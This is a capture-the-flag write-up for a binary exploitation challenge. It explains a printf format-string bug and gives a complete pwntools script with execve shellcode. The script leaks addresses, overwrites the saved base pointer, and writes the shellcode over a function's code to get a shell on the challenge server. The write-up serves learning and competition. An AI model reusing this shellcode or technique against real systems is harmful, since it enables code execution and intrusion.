# Write-What-Where

Note : It goes without mentioning that my solution is a little more complicated & time-consuming debuggin-wise,<br>
but I enjoyed solving it this way, please refer to [the author's original write-up]() for the simpler intended solution.

# Description
The path is clear, but do you know how to get there<br>
Category: PWN
(The code was also provided)

# Why did my mind think this way?

Before solving this challenge, we worked on a reversing challenge that we solved using ChatGPT,<br>
it was just some assembly code comparing the input to the flag char by char, and I noticed that the RBP pointer (and not the RSP pointer)<br>
is the one used to calculate the offset of the buffer in the stack, (I knew this before, but because I saw it again, it registered in the back of my mind)<br>

# Discovery
![](./chall.png)

# Vulnerabilities
If we check the code, we notice that there is a format-string vulnerbility in the print_name function
```c
void print_name(char name[NAME_SIZE]){
    printf(name); // format string :)
}
```

# TL;DR

Technically we can exploit this vuln to overwrite some function code in the code segment with our own shellcode,<br>
but what i did was:
1 Overwrite the RBP pointer using the format-string, to make it point to the menu function in the code segment<br>
2 Use the get_name function to overwrite the menu function code in the code segment with our shellcode.<br>
3 When the menu function gets executed in the next loop iteration, a shell will be poped instead :)<br>

# Exploit

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF("./chall")
context.binary = exe

shellcode = "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"

def conn():
    return remote("write-what-where.ctf.shellmates.club", 443, ssl=True)


def main():
    for i in range(10):
        r = conn()

        # Leaking stack & code addresses
        r.recvuntil(b'Choice')
        r.sendline(b'1')
        r.sendline(b'%7$p\n%9$p')
        r.recvuntil(b'Choice:')
        r.sendline(b'2')
        rbp_addr = int(r.recvline().strip(), 16)  - 0x30
        menu_addr = int(r.recvline().strip(), 16) - 3
        log.info(f"Leaking base pointer address :: {hex(rbp_addr)}")
        log.info(f"Leaking menu function address :: {hex(menu_addr)}")

        r.recvuntil(b'Choice')
        r.sendline(b'1')

        # forming the format-string payload
        left = (menu_addr >> 32) - 12 #12 'a' at the start of the payload
        right = (menu_addr & 0xffffffff) - left #offset of aaaaaa and already written bytes

        s = f'aaaaaaaaaaaa%{str(left)}c%19$n%{str(right)}c%20$n'
        if len(s) != 40:
            log.info(f"bad payload length :: {len(s)}")
            print(s)
            r.close()
            continue

        # overwriting the RBP pointer with a menu function pointer (minus some offset)
        r.sendline(flat(b'aaaaaaaaaaaa%', str(left), b'c%19$n%', str(right), b'c%20$n', p64(rbp_addr+4), p64(rbp_addr)))
        r.recvuntil(b'Choice:')
        r.sendline(b'2')

        # Overwriting menu function code with shellcode using get_name option
        r.recvuntil(b'Choice:')
        r.sendline(b'1')
        r.sendline(flat(shellcode))
        r.interactive()


if __name__ == "__main__":
    main()
```
# Flag from tty

I ran my exploit on my second thinkpad (that had only arch installed with no display manager, because my main laptop was acting up)
![](../flag.jpg)
